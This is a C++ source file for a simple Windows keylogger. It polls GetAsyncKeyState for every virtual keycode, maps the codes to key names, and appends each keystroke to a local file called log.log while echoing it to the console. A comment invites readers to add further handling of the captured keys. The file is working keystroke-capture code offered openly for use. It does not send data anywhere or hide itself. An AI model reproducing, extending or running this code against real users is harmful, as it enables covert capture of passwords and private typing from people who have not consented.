#include <stdio.h>
#include <windows.h>
#include <stdbool.h>
#include <unistd.h>
#include <conio.h>
#include <string>
#include <iostream>

using namespace std;

string convertToString(unsigned int i);

void beginLogging();

void endLogging();

/**
 * converts a virtual keycode to string representation
 * @param i UINT keycode
 * @return string representation of keycode i
 */
string convertToString(UINT i) {
    switch (i) {
        case 1:
            return "Left Mouse";
        case 4:
            return "Middle Mouse";
        case 2:
            return "Right Mouse";
        case 0x08:
            return "Backspace";
        case 0x09:
            return "Tab";
        case 0x0C:
            return "Clear";
        case 0x0D:
            return "Enter";
        case 0x10:
            return "Shift";
        case 0x11:
            return "Control";
        case 0x12:
            return "Menu";
        case 0x13:
            return "Pause";
        case 0x14:
            return "Caps Lock";
        case 0x1B:
            return "ESC";
        case 0x20:
            return "SPACEBAR";
        case 0x21:
            return "PgUp";
        case 0x22:
            return "PgDown";
        case 0x23:
            return "end";
        case 0x24:
            return "home";
        case 0x25:
            return "Left Arrow";
        case 0x26:
            return "Up Arrow";
        case 0x27:
            return "Right Arrow";
        case 0x28:
            return "Down Arrow";
        case 0x29:
            return "Select";
        case 0x2A:
            return "PRINT";
        case 0x2B:
            return "Execute";
        case 0x2C:
            return "PrintScreen";
        case 0x2D:
            return "INS";
        case 0x2E:
            return "DELETE";
        case 0x2F:
            return "HELP";
        case 48:
            return "0";
        case 49:
            return "1";
        case 50:
            return "2";
        case 51:
            return "3";
        case 52:
            return "4";
        case 53:
            return "5";
        case 54:
            return "6";
        case 55:
            return "7";
        case 56:
            return "8";
        case 57:
            return "9";
        case 65:
            return "A";
        case 66:
            return "B";
        case 67:
            return "C";
        case 68:
            return "D";
        case 69:
            return "E";
        case 70:
            return "F";
        case 71:
            return "G";
        case 72:
            return "H";
        case 73:
            return "I";
        case 74:
            return "J";
        case 75:
            return "K";
        case 76:
            return "L";
        case 77:
            return "M";
        case 78:
            return "N";
        case 79:
            return "O";
        case 80:
            return "P";
        case 81:
            return "Q";
        case 82:
            return "R";
        case 83:
            return "S";
        case 84:
            return "T";
        case 85:
            return "U";
        case 86:
            return "V";
        case 87:
            return "W";
        case 88:
            return "X";
        case 89:
            return "Y";
        case 90:
            return "Z";
    }


    return "";
}

/**Determines wether the keylogger should keep logging
 * after current loop is finished.*/
bool keepLogging = true;

/**Begins logging keystrokes */
void beginLogging() {
    //clears out the current keystates, there is a way where you dont need this (LSB or MSB of
    //GetAsyncKeyState() shows if the key is currently pressed, but this was is easier)
    for(UINT i = 8; i < 255; i++){
        GetAsyncKeyState(i);
    }
	FILE * fd = fopen("log.log","w");
    //Loops through all possible Virtual Keycode UINTS
    for (UINT i = 8;; i++) {
        //if it returns 0x00 then nothing is pressed
        if (GetAsyncKeyState(i) != 0x00) {
            //gets a string representing the key pressed
            string c = convertToString(i);
            //if c is null either an error occurred or the key isnt yet supported
            if(c.compare("") != 0) {
                //anything you  want to do with this should be done here
                fprintf(fd,"%s\n", c.c_str());
				printf("%s\n", c.c_str());
				fflush(fd);
            }
        }
        //could be a better fix for this but without this delay it spits out multiple false positives because key is
        // probably still pressed within the time that its checking
        if (i == 254) {
            //254 is highest value for virtual keycode
            if (!keepLogging) {
                //check if we should keep logging
                break;
            }
            //reset i and go again
			usleep(5);
            i = 0;
        }
    }
	fclose(fd);
}

/**Stops the keylogger from logging */
void endLogging() {
    keepLogging = false;
}
